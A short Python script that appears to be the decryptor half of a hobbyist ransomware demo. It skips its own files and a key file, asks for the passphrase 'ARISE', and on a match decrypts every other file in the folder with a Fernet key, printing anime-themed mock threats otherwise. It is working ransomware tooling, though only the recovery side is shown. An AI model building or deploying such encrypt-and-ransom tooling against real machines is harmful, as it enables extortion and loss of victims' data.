import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "1gr15.py" or file == "thekey.key" or file == "sungj1nw00.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

commandline = "ARISE"

user_phrase = input("Say the command to access the files: \n")

if user_phrase == commandline:
        for file in files:
                with open(file,"rb") as thefile:
                        contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
        print("Congrats for obeying my liege and escaping from the deletion.")        

else:
    print("Beru kill the files and eat them up.")
